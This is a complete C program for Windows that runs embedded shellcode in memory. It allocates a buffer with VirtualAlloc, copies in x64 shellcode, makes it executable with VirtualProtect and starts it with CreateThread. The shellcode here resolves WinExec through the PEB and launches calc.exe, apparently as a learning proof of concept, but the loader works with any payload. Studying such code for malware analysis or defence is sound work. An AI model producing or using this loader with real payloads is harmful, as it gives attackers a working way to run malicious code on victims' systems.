#include <windows.h>
#include <stdio.h>

int main()
{
    // Your raw shellcode from the ASM compilation
    // See calc.asm for original source and README for build steps
    unsigned char payload[] = {
        0x48, 0x83, 0xec, 0x28, 0x48, 0x31, 0xf6, 0x65, 0x48, 0x8b, 0x76, 0x60,
        0x48, 0x8b, 0x76, 0x18, 0x48, 0x8b, 0x76, 0x30, 0x48, 0x8b, 0x36, 0x48,
        0x8b, 0x36, 0x48, 0x8b, 0x6e, 0x10, 0x8b, 0x45, 0x3c, 0x48, 0x01, 0xe8,
        0x8b, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48, 0x01, 0xe8, 0x44, 0x8b, 0x60,
        0x18, 0x44, 0x8b, 0x68, 0x20, 0x49, 0x01, 0xed, 0x44, 0x8b, 0x70, 0x24,
        0x49, 0x01, 0xee, 0x44, 0x8b, 0x78, 0x1c, 0x49, 0x01, 0xef, 0x49, 0xff,
        0xcc, 0x43, 0x8b, 0x7c, 0xa5, 0x00, 0x48, 0x01, 0xef, 0x48, 0xb8, 0x57,
        0x69, 0x6e, 0x45, 0x78, 0x65, 0x63, 0x00, 0x48, 0x39, 0x07, 0x75, 0xe6,
        0x43, 0x0f, 0xb7, 0x04, 0x66, 0x41, 0x8b, 0x04, 0x87, 0x48, 0x01, 0xe8,
        0x48, 0x31, 0xc9, 0x51, 0x48, 0xba, 0x63, 0x61, 0x6c, 0x63, 0x2e, 0x65,
        0x78, 0x65, 0x52, 0x48, 0x89, 0xe1, 0xba, 0x01, 0x00, 0x00, 0x00, 0xff,
        0xd0, 0x48, 0x83, 0xc4, 0x38, 0xc3};

    SIZE_T payloadSize = sizeof(payload);
    //DWORD shellcode_size = sizeof(shellcode);

    // 1) Allocate memory for the staged buffer
    LPVOID mem = VirtualAlloc(
        NULL,
        payloadSize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE);

    if (mem == NULL)
    {
        printf("VirtualAlloc failed: %lu\n", GetLastError());
        return 1;
    }

    // 2) Copy embedded bytes into allocated memory
    memcpy(mem, payload, payloadSize);

    printf("Allocated %zu bytes at %p and copied embedded buffer.\n", payloadSize, mem);

    // 3) Optional: change protection to RX to simulate execution prep
    DWORD oldProtect = 0;
    if (!VirtualProtect(mem, payloadSize, PAGE_EXECUTE_READ, &oldProtect))
    {
        printf("VirtualProtect failed: %lu\n", GetLastError());
        VirtualFree(mem, 0, MEM_RELEASE);
        return 1;
    }

    printf("Changed memory protection to PAGE_EXECUTE_READ.\n");

    // 4) Create a new thread to execute the shellcode
    HANDLE hThread = CreateThread(
        NULL,                        // Default security attributes
        0,                           // Default stack size
        (LPTHREAD_START_ROUTINE)mem, // Starting address (your shellcode)
        NULL,                        // No parameters
        0,                           // Defer flags
        NULL                         // Thread ID
    );

    if (hThread == NULL)
    {
        printf("CreateThread failed: %lu\n", GetLastError());
    }
    else
    {
        printf("Thread created. Waiting for shellcode to finish...\n");
        WaitForSingleObject(hThread, INFINITE); // Wait for calc.exe to be triggered
        CloseHandle(hThread);
    }

    VirtualFree(mem, 0, MEM_RELEASE);
    return 0;
}